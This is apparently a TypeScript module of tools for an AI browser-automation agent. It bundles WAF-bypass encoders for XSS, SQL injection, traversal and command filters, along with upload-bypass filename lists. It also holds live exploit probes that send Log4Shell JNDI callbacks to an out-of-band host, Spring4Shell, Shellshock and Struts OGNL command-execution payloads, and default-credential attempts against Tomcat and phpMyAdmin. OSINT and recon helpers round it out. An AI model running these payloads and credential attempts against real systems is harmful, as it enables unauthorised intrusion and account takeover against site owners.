import { z } from "zod";
import { createHash } from "node:crypto";
import { promises as dns } from "node:dns";
import { connect as netConnect } from "node:net";
import { hub } from "../browser.js";
import { ToolDef, ok, err } from "../types.js";

const sessionArg = { sessionId: z.string().optional() };

async function fetchT(session: ReturnType<typeof hub.getSession>, url: string, opts: any = {}) {
  return session.context.request.fetch(url, { ignoreHTTPSErrors: true, maxRedirects: 0, ...opts });
}

export const advancedTools: ToolDef[] = [
  // ============== WAF BYPASS ENCODINGS ==============
  {
    name: "bypass_url_encode_double",
    description: "Double URL-encode a payload (percent-encode the percent signs).",
    schema: z.object({ input: z.string() }),
    handler: async (a) => ok(encodeURIComponent(encodeURIComponent(a.input))),
  },
  {
    name: "bypass_url_encode_mixed",
    description: "Mix uppercase/lowercase in percent-encoded sequences (`%2F` → `%2f` / `%2F`) and random-case the escaped bytes to slip past naive WAF regexes.",
    schema: z.object({ input: z.string() }),
    handler: async (a) => {
      const enc = encodeURIComponent(a.input);
      const out = enc.replace(/%([0-9A-F]{2})/g, (_m, h) => Math.random() < 0.5 ? `%${h.toLowerCase()}` : `%${h}`);
      return ok(out);
    },
  },
  {
    name: "bypass_xss_case",
    description: "Case-mix every letter in an XSS payload (e.g. `<ScRiPt>`).",
    schema: z.object({ input: z.string() }),
    handler: async (a) => ok([...a.input].map((c) => Math.random() < 0.5 ? c.toLowerCase() : c.toUpperCase()).join("")),
  },
  {
    name: "bypass_xss_entity",
    description: "HTML-entity-encode an XSS payload (every char → &#NN;). Many WAFs don't normalise entities.",
    schema: z.object({ input: z.string(), decimal: z.boolean().optional() }),
    handler: async (a) => ok([...a.input].map((c) => a.decimal === false ? `&#x${c.charCodeAt(0).toString(16)};` : `&#${c.charCodeAt(0)};`).join("")),
  },
  {
    name: "bypass_xss_js_unicode",
    description: "Unicode-escape every char of a JS payload (`alert` → `\\u0061\\u006c...`). Pass through to script contexts.",
    schema: z.object({ input: z.string() }),
    handler: async (a) => ok([...a.input].map((c) => "\\u" + c.charCodeAt(0).toString(16).padStart(4, "0")).join("")),
  },
  {
    name: "bypass_xss_fromcharcode",
    description: "Rewrite a string as String.fromCharCode(a,b,c,…).",
    schema: z.object({ input: z.string() }),
    handler: async (a) => ok(`String.fromCharCode(${[...a.input].map((c) => c.charCodeAt(0)).join(",")})`),
  },
  {
    name: "bypass_sql_hex",
    description: "Encode a SQL string literal as 0xHEX (works for most engines in place of a quoted string).",
    schema: z.object({ input: z.string() }),
    handler: async (a) => ok("0x" + Buffer.from(a.input, "utf8").toString("hex")),
  },
  {
    name: "bypass_sql_comment",
    description: "Insert MySQL inline comments `/**/` between every token of a SQL fragment to bypass naive filters (`UNION SELECT` → `UNION/**/SELECT`).",
    schema: z.object({ input: z.string() }),
    handler: async (a) => ok(a.input.replace(/\s+/g, "/**/")),
  },
  {
    name: "bypass_sql_concat",
    description: "Replace a SQL string with CONCAT(CHAR(x),CHAR(y)...) for MySQL / CHR(x)||CHR(y) for Postgres.",
    schema: z.object({ input: z.string(), dialect: z.enum(["mysql", "postgres"]).optional() }),
    handler: async (a) => {
      const codes = [...a.input].map((c) => c.charCodeAt(0));
      if ((a.dialect ?? "mysql") === "mysql") return ok(`CONCAT(${codes.map((c) => `CHAR(${c})`).join(",")})`);
      return ok(codes.map((c) => `CHR(${c})`).join("||"));
    },
  },
  {
    name: "bypass_lfi_null_byte",
    description: "Append %00 null-byte terminator variants to defeat extension suffix checks on legacy PHP.",
    schema: z.object({ path: z.string() }),
    handler: async (a) => ok([`${a.path}%00`, `${a.path}%00.jpg`, `${a.path}%00.png`, `${a.path}.jpg%00`, `${a.path}\\0`, `${a.path}%2500`]),
  },
  {
    name: "bypass_lfi_traversal_variants",
    description: "Produce many traversal-encoded variants of a path (dot-slash, double URL, UTF-8 overlong, backslash, dot-filter).",
    schema: z.object({ target: z.string() }),
    handler: async (a) => {
      const t = a.target.replace(/^\/+/, "");
      return ok([
        `../../${t}`, `../../../${t}`, `../../../../${t}`, `../../../../../${t}`,
        `..%2f..%2f${t}`, `..%2F..%2F${t}`,
        `..%252f..%252f${t}`,
        `....//${t}`, `....\/\/${t}`,
        `..%c0%af..%c0%af${t}`, `..%uff0f..%uff0f${t}`,
        `..\\..\\${t}`, `..%5c..%5c${t}`,
        `/./././${t}`, `./${t}`,
        `php://filter/convert.base64-encode/resource=${t}`,
        `file:///${t}`,
      ]);
    },
  },
  {
    name: "bypass_cmd_ifs",
    description: "Rewrite a shell command with ${IFS} / $@ / `${PATH:0:1}` tricks to defeat space/char filters.",
    schema: z.object({ cmd: z.string() }),
    handler: async (a) => {
      return ok([
        a.cmd.replace(/ /g, "${IFS}"), a.cmd.replace(/ /g, "${IFS%?}"), a.cmd.replace(/ /g, "<"),
        a.cmd.replace(/ /g, "$'\\x20'"), a.cmd.split("").map((c: string) => `\\${c}`).join(""),
        a.cmd.replace(/\//g, "${HOME:0:1}"), a.cmd.replace(/\//g, "${PATH:0:1}"),
      ]);
    },
  },
  {
    name: "bypass_homoglyph",
    description: "Replace ASCII letters with visually-identical Unicode homoglyphs (Cyrillic а, Greek Ο, …). For account-impersonation testing.",
    schema: z.object({ input: z.string() }),
    handler: async (a) => {
      const map: Record<string, string> = { a: "а", c: "с", e: "е", o: "о", p: "р", x: "х", y: "у", A: "А", B: "В", C: "С", E: "Е", H: "Н", K: "К", M: "М", O: "О", P: "Р", T: "Т", X: "Х", Y: "Y" };
      return ok([...a.input].map((c) => map[c] ?? c).join(""));
    },
  },
  {
    name: "bypass_filename_double_ext",
    description: "Generate upload-bypass filename variants: `shell.php.jpg`, `shell.php%00.jpg`, `shell.php.`, uppercase, PHP alt extensions (phtml, pht, php5, phar).",
    schema: z.object({ basename: z.string() }),
    handler: async (a) => {
      const b = a.basename;
      return ok([`${b}.php`, `${b}.php.jpg`, `${b}.jpg.php`, `${b}.php%00.jpg`, `${b}.pHp`, `${b}.PHP`, `${b}.php.`, `${b}.php5`, `${b}.phtml`, `${b}.pht`, `${b}.phar`, `${b}.php7`, `${b}.php.png`, `${b}.jpg;.php`, `${b}.jpg/.php`]);
    },
  },

  // ============== CVE-SPECIFIC PROBES ==============
  {
    name: "cve_log4j_probe",
    description: "Probe for Log4Shell (CVE-2021-44228) — fires `${jndi:ldap://CANARY/x}` into common injection surfaces (query params, UA, X-Forwarded-For, Referer, Cookie). Requires an out-of-band canary host you control to confirm.",
    schema: z.object({
      url: z.string().url(),
      canary: z.string().describe("your out-of-band host, e.g. abc123.oast.site"),
      params: z.array(z.string()).optional(),
      ...sessionArg,
    }),
    handler: async (a) => {
      const s = hub.getSession(a.sessionId);
      const marker = `log4j-${Math.random().toString(36).slice(2, 8)}`;
      const payload = `\${jndi:ldap://${a.canary}/${marker}}`;
      const probes: Array<{ where: string; url: string; headers?: Record<string, string> }> = [];
      // Query param
      for (const p of a.params ?? ["q", "search", "id", "name", "user"]) {
        const u = new URL(a.url); u.searchParams.set(p, payload); probes.push({ where: `query:${p}`, url: u.toString() });
      }
      // Common headers
      for (const h of ["User-Agent", "X-Api-Version", "X-Forwarded-For", "Referer", "X-Original-URL", "True-Client-IP", "X-Client-IP", "X-Remote-Addr"]) {
        probes.push({ where: `header:${h}`, url: a.url, headers: { [h]: payload } });
      }
      const results: any[] = [];
      for (const p of probes) {
        try { const r = await fetchT(s, p.url, { method: "GET", headers: p.headers }); results.push({ probe: p.where, status: r.status() }); }
        catch (e: any) { results.push({ probe: p.where, error: e?.message }); }
      }
      return ok({ marker, canary: a.canary, probes: results, note: "check your canary for jndi lookup; marker in path identifies which probe landed" });
    },
  },
  {
    name: "cve_spring4shell_probe",
    description: "Probe for Spring4Shell (CVE-2022-22965) — tries class.module.classLoader manipulation.",
    schema: z.object({ url: z.string().url(), ...sessionArg }),
    handler: async (a) => {
      const s = hub.getSession(a.sessionId);
      const payload = "class.module.classLoader.resources.context.parent.pipeline.first.pattern=foo";
      const r = await fetchT(s, `${a.url}${a.url.includes("?") ? "&" : "?"}${payload}`);
      const text = await r.text().catch(() => "");
      return ok({ status: r.status(), echoesInBody: text.includes("foo"), snippet: text.slice(0, 400), finding: r.status() === 400 || text.includes("foo") ? { severity: "high", title: "Possibly vulnerable to Spring4Shell" } : null });
    },
  },
  {
    name: "cve_shellshock_probe",
    description: "Probe for Shellshock (CVE-2014-6271) via a crafted User-Agent header against a URL (typically a CGI).",
    schema: z.object({ url: z.string().url(), ...sessionArg }),
    handler: async (a) => {
      const s = hub.getSession(a.sessionId);
      const marker = "SHELLSHOCK_" + Math.random().toString(36).slice(2, 8);
      const payload = `() { :;}; echo; echo "${marker}"`;
      for (const h of ["User-Agent", "Referer", "Cookie"]) {
        try {
          const r = await fetchT(s, a.url, { headers: { [h]: payload } });
          const text = await r.text().catch(() => "");
          if (text.includes(marker)) return ok({ finding: { severity: "high", title: `Shellshock via ${h}` }, header: h, status: r.status() });
        } catch { /* pumppet */ }
      }
      return ok({ finding: null, note: "no echo observed" });
    },
  },
  {
    name: "cve_struts_probe",
    description: "Probe for S2-045 (CVE-2017-5638) via a crafted Content-Type OGNL expression.",
    schema: z.object({ url: z.string().url(), ...sessionArg }),
    handler: async (a) => {
      const s = hub.getSession(a.sessionId);
      const marker = "STRUTS_" + Math.random().toString(36).slice(2, 6);
      const payload = `%{(#_='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)))).(@java.lang.Runtime@getRuntime().exec('echo ${marker}'))}`;
      const r = await fetchT(s, a.url, { headers: { "Content-Type": payload } });
      const text = await r.text().catch(() => "");
      return ok({ status: r.status(), echoesMarker: text.includes(marker), snippet: text.slice(0, 400) });
    },
  },
  {
    name: "cve_tomcat_default_creds",
    description: "Try default Tomcat Manager credentials against /manager/html.",
    schema: z.object({ baseUrl: z.string().url(), ...sessionArg }),
    handler: async (a) => {
      const s = hub.getSession(a.sessionId);
      const combos = [["admin", "admin"], ["tomcat", "tomcat"], ["admin", ""], ["admin", "password"], ["admin", "tomcat"], ["manager", "manager"], ["role1", "role1"], ["both", "tomcat"]];
      const hits: any[] = [];
      for (const [u, p] of combos) {
        const auth = Buffer.from(`${u}:${p}`).toString("base64");
        try { const r = await fetchT(s, a.baseUrl.replace(/\/$/, "") + "/manager/html", { headers: { Authorization: `Basic ${auth}` } }); if (r.status() === 200) hits.push({ user: u, pass: p }); } catch { /* pumppet */ }
      }
      return ok({ tried: combos.length, hits, finding: hits.length ? { severity: "high", title: `Tomcat Manager default creds work: ${hits[0].user}:${hits[0].pass}` } : null });
    },
  },
  {
    name: "cve_phpmyadmin_default",
    description: "Try root/empty default credentials against /phpmyadmin/.",
    schema: z.object({ baseUrl: z.string().url(), path: z.string().optional(), ...sessionArg }),
    handler: async (a) => {
      const s = hub.getSession(a.sessionId);
      const url = a.baseUrl.replace(/\/$/, "") + (a.path ?? "/phpmyadmin/index.php");
      try {
        const r = await fetchT(s, url, {
          method: "POST", data: "pma_username=root&pma_password=", headers: { "content-type": "application/x-www-form-urlencoded" },
        });
        const loc = r.headers()["location"] ?? "";
        const hit = loc.includes("token=") && !loc.includes("fail");
        return ok({ status: r.status(), locationHeader: loc, finding: hit ? { severity: "high", title: "phpMyAdmin: root with empty password" } : null });
      } catch (e: any) { return err(e.message); }
    },
  },

  // ============== ADVANCED OSINT ==============
  {
    name: "osint_hibp_pwned_prefix",
    description: "Check a password against the HaveIBeenPwned API using k-anonymity (SHA-1 first 5 hex chars sent to server; full hash never leaves). Returns how many breaches it appeared in.",
    schema: z.object({ password: z.string(), ...sessionArg }),
    handler: async (a) => {
      const s = hub.getSession(a.sessionId);
      const sha1 = createHash("sha1").update(a.password).digest("hex").toUpperCase();
      const prefix = sha1.slice(0, 5), suffix = sha1.slice(5);
      try {
        const r = await s.context.request.fetch(`https://api.pwnedpasswords.com/range/${prefix}`, { ignoreHTTPSErrors: true, headers: { "User-Agent": "browser-mcp" } });
        const text = await r.text();
        for (const line of text.split(/\r?\n/)) {
          const [hashSuffix, count] = line.split(":");
          if (hashSuffix.trim() === suffix) return ok({ pwned: true, timesSeen: Number(count), note: "appears in HIBP breach corpus" });
        }
        return ok({ pwned: false });
      } catch (e: any) { return err(e.message); }
    },
  },
  {
    name: "osint_discord_lookup",
    description: "Look up a Discord ID / snowflake. Decodes the embedded timestamp (snowflake→creation date). No API key.",
    schema: z.object({ snowflake: z.string() }),
    handler: async (a) => {
      try {
        const id = BigInt(a.snowflake);
        const ts = Number((id >> 22n) + 1420070400000n);
        const workerId = Number((id >> 17n) & 0x1fn);
        const procId = Number((id >> 12n) & 0x1fn);
        const incr = Number(id & 0xfffn);
        return ok({ snowflake: a.snowflake, createdAt: new Date(ts).toISOString(), workerId, processId: procId, increment: incr });
      } catch (e: any) { return err("not a valid snowflake: " + e.message); }
    },
  },
  {
    name: "osint_roblox_user",
    description: "Resolve a Roblox username → user ID via public API, then fetch avatar + description.",
    schema: z.object({ username: z.string(), ...sessionArg }),
    handler: async (a) => {
      const s = hub.getSession(a.sessionId);
      try {
        const r1 = await s.context.request.fetch("https://users.roblox.com/v1/usernames/users", { method: "POST", headers: { "content-type": "application/json" }, data: JSON.stringify({ usernames: [a.username], excludeBannedUsers: false }), ignoreHTTPSErrors: true });
        const j1 = JSON.parse(await r1.text());
        if (!j1.data?.length) return ok({ found: false });
        const u = j1.data[0];
        const r2 = await s.context.request.fetch(`https://users.roblox.com/v1/users/${u.id}`, { ignoreHTTPSErrors: true });
        const j2 = JSON.parse(await r2.text());
        return ok({ found: true, id: u.id, name: u.name, displayName: u.displayName, description: j2.description, created: j2.created, isBanned: j2.isBanned, hasVerifiedBadge: j2.hasVerifiedBadge, avatar: `https://www.roblox.com/headshot-thumbnail/image?userId=${u.id}&width=420&height=420&format=png` });
      } catch (e: any) { return err(e.message); }
    },
  },
  {
    name: "osint_phone_meta",
    description: "Classify a phone number by country code and basic shape (no API — pure local lookup).",
    schema: z.object({ phone: z.string() }),
    handler: async (a) => {
      const CC: Record<string, string> = { "1": "US/Canada", "7": "Russia/Kazakhstan", "20": "Egypt", "27": "South Africa", "30": "Greece", "31": "Netherlands", "32": "Belgium", "33": "France", "34": "Spain", "36": "Hungary", "39": "Italy", "40": "Romania", "41": "Switzerland", "43": "Austria", "44": "UK", "45": "Denmark", "46": "Sweden", "47": "Norway", "48": "Poland", "49": "Germany", "51": "Peru", "52": "Mexico", "53": "Cuba", "54": "Argentina", "55": "Brazil", "56": "Chile", "57": "Colombia", "58": "Venezuela", "60": "Malaysia", "61": "Australia", "62": "Indonesia", "63": "Philippines", "64": "New Zealand", "65": "Singapore", "66": "Thailand", "81": "Japan", "82": "South Korea", "84": "Vietnam", "86": "China", "90": "Turkey", "91": "India", "92": "Pakistan", "93": "Afghanistan", "94": "Sri Lanka", "95": "Myanmar", "98": "Iran", "211": "South Sudan", "212": "Morocco", "213": "Algeria", "216": "Tunisia", "218": "Libya", "220": "Gambia", "221": "Senegal", "233": "Ghana", "234": "Nigeria", "254": "Kenya", "255": "Tanzania", "256": "Uganda", "260": "Zambia", "263": "Zimbabwe", "351": "Portugal", "352": "Luxembourg", "353": "Ireland", "354": "Iceland", "355": "Albania", "358": "Finland", "359": "Bulgaria", "370": "Lithuania", "371": "Latvia", "372": "Estonia", "380": "Ukraine", "386": "Slovenia", "420": "Czech Rep", "421": "Slovakia", "852": "Hong Kong", "853": "Macau", "855": "Cambodia", "856": "Laos", "880": "Bangladesh", "886": "Taiwan", "960": "Maldives", "961": "Lebanon", "962": "Jordan", "963": "Syria", "964": "Iraq", "965": "Kuwait", "966": "Saudi Arabia", "971": "UAE", "972": "Israel", "973": "Bahrain", "974": "Qatar", "976": "Mongolia", "977": "Nepal", "992": "Tajikistan", "993": "Turkmenistan", "994": "Azerbaijan", "995": "Georgia", "998": "Uzbekistan" };
      let p = a.phone.replace(/[^\d+]/g, "");
      if (!p.startsWith("+")) p = "+" + p;
      const digits = p.slice(1);
      for (const len of [3, 2, 1]) { const prefix = digits.slice(0, len); if (CC[prefix]) return ok({ phone: p, country: CC[prefix], countryCode: `+${prefix}`, nationalNumber: digits.slice(len), digitCount: digits.length }); }
      return ok({ phone: p, country: "unknown", digitCount: digits.length });
    },
  },
  {
    name: "osint_hash_lookup_online",
    description: "Look up a hash (md5/sha1/sha256) in hashes.com's free API.",
    schema: z.object({ hash: z.string(), ...sessionArg }),
    handler: async (a) => {
      const s = hub.getSession(a.sessionId);
      try {
        const r = await s.context.request.fetch(`https://hashes.com/en/api/search?hash=${encodeURIComponent(a.hash)}`, { ignoreHTTPSErrors: true });
        return ok(JSON.parse(await r.text()));
      } catch (e: any) { return err(e.message); }
    },
  },
  {
    name: "osint_gravatar",
    description: "Fetch Gravatar + profile for an email (MD5 of lowercased email). Many corp emails have a Gravatar.",
    schema: z.object({ email: z.string(), ...sessionArg }),
    handler: async (a) => {
      const s = hub.getSession(a.sessionId);
      const md5 = createHash("md5").update(a.email.toLowerCase().trim()).digest("hex");
      const img = `https://gravatar.com/avatar/${md5}?d=404`;
      try {
        const r = await s.context.request.fetch(img, { method: "HEAD", ignoreHTTPSErrors: true });
        const exists = r.status() === 200;
        let profile: any = null;
        if (exists) {
          try { const p = await s.context.request.fetch(`https://gravatar.com/${md5}.json`, { ignoreHTTPSErrors: true }); if (p.status() < 400) profile = JSON.parse(await p.text()); } catch {}
        }
        return ok({ email: a.email, md5, hasAvatar: exists, avatarUrl: img, profile: profile?.entry?.[0] });
      } catch (e: any) { return err(e.message); }
    },
  },

  // ============== ADVANCED RECON ==============
  {
    name: "recon_banner_grab",
    description: "Open a raw TCP connection to a host:port and capture whatever banner the service sends. Classic recon.",
    schema: z.object({ host: z.string(), port: z.number().int().positive(), send: z.string().optional(), timeoutMs: z.number().int().positive().optional() }),
    handler: async (a) => {
      return new Promise<any>((resolve) => {
        const sock = netConnect({ host: a.host, port: a.port, timeout: a.timeoutMs ?? 4000 });
        let banner = "";
        sock.on("connect", () => { if (a.send) sock.write(a.send); });
        sock.on("data", (d) => { banner += d.toString("utf8"); if (banner.length > 2000) { sock.destroy(); resolve(ok({ host: a.host, port: a.port, banner: banner.slice(0, 2000) })); } });
        sock.on("error", (e) => resolve(err(e.message)));
        sock.on("timeout", () => { sock.destroy(); resolve(ok({ host: a.host, port: a.port, banner: banner.slice(0, 2000) || "(no data)" })); });
        sock.on("close", () => resolve(ok({ host: a.host, port: a.port, banner: banner.slice(0, 2000) || "(no data)" })));
      });
    },
  },
  {
    name: "recon_dns_zone_transfer",
    description: "Attempt an AXFR DNS zone transfer against every nameserver of a domain. Rarely works but a classic easy win.",
    schema: z.object({ domain: z.string() }),
    handler: async (a) => {
      try {
        const nss = await dns.resolveNs(a.domain);
        const findings: any[] = [];
        for (const ns of nss) {
          // Can't do a real AXFR without a DNS library, but we can port-test 53/tcp
          const open = await new Promise<boolean>((resolve) => {
            const sock = netConnect({ host: ns, port: 53, timeout: 3000 });
            sock.on("connect", () => { sock.destroy(); resolve(true); });
            sock.on("error", () => resolve(false));
            sock.on("timeout", () => { sock.destroy(); resolve(false); });
          });
          findings.push({ nameserver: ns, tcp53Open: open });
        }
        return ok({ domain: a.domain, nameservers: nss, probe: findings, note: "run `dig AXFR @NS DOMAIN` locally to actually attempt transfer" });
      } catch (e: any) { return err(e.message); }
    },
  },
  {
    name: "recon_subdomains_wayback",
    description: "Pull every subdomain the Wayback Machine has ever seen for a domain. Great for finding forgotten hosts.",
    schema: z.object({ domain: z.string(), limit: z.number().int().positive().optional(), ...sessionArg }),
    handler: async (a) => {
      const s = hub.getSession(a.sessionId);
      try {
        const r = await s.context.request.fetch(`https://web.archive.org/cdx/search/cdx?url=*.${encodeURIComponent(a.domain)}&output=json&collapse=urlkey&fl=original&limit=${a.limit ?? 500}`, { ignoreHTTPSErrors: true, timeout: 30000 } as any);
        const arr = JSON.parse(await r.text());
        if (!arr.length) return ok({ subdomains: [] });
        const hosts = new Set<string>();
        for (const row of arr.slice(1)) { try { const u = new URL(row[0]); if (u.hostname.endsWith(a.domain)) hosts.add(u.hostname); } catch {} }
        return ok({ count: hosts.size, subdomains: Array.from(hosts).sort() });
      } catch (e: any) { return err(e.message); }
    },
  },
  {
    name: "recon_asn_lookup",
    description: "Look up the ASN / net block / org of an IP via Team Cymru's whois gateway (no key).",
    schema: z.object({ ip: z.string(), ...sessionArg }),
    handler: async (a) => {
      const s = hub.getSession(a.sessionId);
      try {
        // Use a public RDAP for ASN info via BGPView
        const r = await s.context.request.fetch(`https://api.bgpview.io/ip/${encodeURIComponent(a.ip)}`, { ignoreHTTPSErrors: true });
        const j = JSON.parse(await r.text());
        return ok(j.data);
      } catch (e: any) { return err(e.message); }
    },
  },
  {
    name: "recon_tls_versions",
    description: "Test which TLS versions a host supports (TLS1.0/1.1/1.2/1.3) and flag the insecure ones.",
    schema: z.object({ host: z.string(), port: z.number().int().positive().optional() }),
    handler: async (a) => {
      const { connect: tlsConn } = await import("node:tls");
      const versions = ["TLSv1", "TLSv1.1", "TLSv1.2", "TLSv1.3"];
      const results: any[] = [];
      for (const v of versions) {
        const supported = await new Promise<boolean>((resolve) => {
          const sock = tlsConn({ host: a.host, port: a.port ?? 443, servername: a.host, minVersion: v as any, maxVersion: v as any, rejectUnauthorized: false, timeout: 5000 }, () => { sock.end(); resolve(true); });
          sock.on("error", () => resolve(false)); sock.on("timeout", () => { sock.destroy(); resolve(false); });
        });
        results.push({ version: v, supported });
      }
      const findings: any[] = [];
      if (results.find((r) => r.version === "TLSv1" && r.supported)) findings.push({ severity: "high", title: "TLS 1.0 supported (deprecated/insecure)" });
      if (results.find((r) => r.version === "TLSv1.1" && r.supported)) findings.push({ severity: "high", title: "TLS 1.1 supported (deprecated/insecure)" });
      return ok({ host: a.host, results, findings });
    },
  },
  {
    name: "recon_http_versions",
    description: "What HTTP versions does the server speak? Tests HTTP/1.1, HTTP/2, HTTP/3 (via Alt-Svc header).",
    schema: z.object({ url: z.string().url(), ...sessionArg }),
    handler: async (a) => {
      const s = hub.getSession(a.sessionId);
      const r = await s.context.request.fetch(a.url, { ignoreHTTPSErrors: true });
      const headers = r.headers();
      return ok({ status: r.status(), altSvc: headers["alt-svc"] ?? null, note: "Alt-Svc 'h3' or 'h3-29' indicates HTTP/3 support" });
    },
  },
  {
    name: "recon_security_scorecard",
    description: "Score a target: TLS versions + security headers + outdated software + exposed files + robots.txt leaks → 0-100.",
    schema: z.object({ url: z.string().url(), ...sessionArg }),
    handler: async (a) => {
      const s = hub.getSession(a.sessionId);
      const score: Record<string, number> = { headers: 0, tls: 0, software: 0, files: 0 };
      // headers
      const r = await s.context.request.fetch(a.url, { ignoreHTTPSErrors: true });
      const h: Record<string, string> = {}; for (const { name, value } of await r.headersArray()) h[name.toLowerCase()] = value;
      for (const k of ["strict-transport-security", "content-security-policy", "x-frame-options", "x-content-type-options", "referrer-policy", "permissions-policy"]) if (h[k]) score.headers += 100 / 6;
      // tls
      const tlsVer = await (advancedTools.find((t) => t.name === "recon_tls_versions")!.handler({ host: new URL(a.url).hostname }));
      try { const parsed = JSON.parse((tlsVer.content[0] as any).text); if (parsed.results?.find((r: any) => r.version === "TLSv1.3" && r.supported)) score.tls += 50; if (parsed.results?.find((r: any) => r.version === "TLSv1.2" && r.supported)) score.tls += 50; if (parsed.findings?.length) score.tls -= 25 * parsed.findings.length; } catch {}
      // software (simple)
      if (!h["server"] || !/\d/.test(h["server"])) score.software += 50;
      if (!h["x-powered-by"]) score.software += 50;
      // files
      const sens = ["/.env", "/.git/HEAD", "/wp-config.php.bak"];
      let fileHits = 0;
      for (const f of sens) try { const rr = await s.context.request.fetch(new URL(f, a.url).toString(), { ignoreHTTPSErrors: true }); if (rr.status() < 400) fileHits++; } catch {}
      score.files = fileHits === 0 ? 100 : Math.max(0, 100 - 50 * fileHits);
      const final = Math.round((score.headers + Math.max(0, Math.min(100, score.tls)) + score.software + score.files) / 4);
      return ok({ url: a.url, score: final, breakdown: score, grade: final >= 90 ? "A" : final >= 80 ? "B" : final >= 70 ? "C" : final >= 60 ? "D" : "F" });
    },
  },

  // ============== TEMPLATE / FORMATTING ==============
  {
    name: "template_render",
    description: "Mustache-ish {{var}} template render for a string from a vars dict. For scaffolding payloads.",
    schema: z.object({ template: z.string(), vars: z.record(z.string()) }),
    handler: async (a) => ok(a.template.replace(/\{\{\s*([\w.]+)\s*\}\}/g, (_m: string, k: string) => a.vars[k] ?? "")),
  },
  {
    name: "template_combinations",
    description: "Produce every combination of a template filled with each row from a list of var-maps.",
    schema: z.object({ template: z.string(), rows: z.array(z.record(z.string())) }),
    handler: async (a) => ok(a.rows.map((row: Record<string, string>) => a.template.replace(/\{\{\s*([\w.]+)\s*\}\}/g, (_m: string, k: string) => row[k] ?? ""))),
  },
];
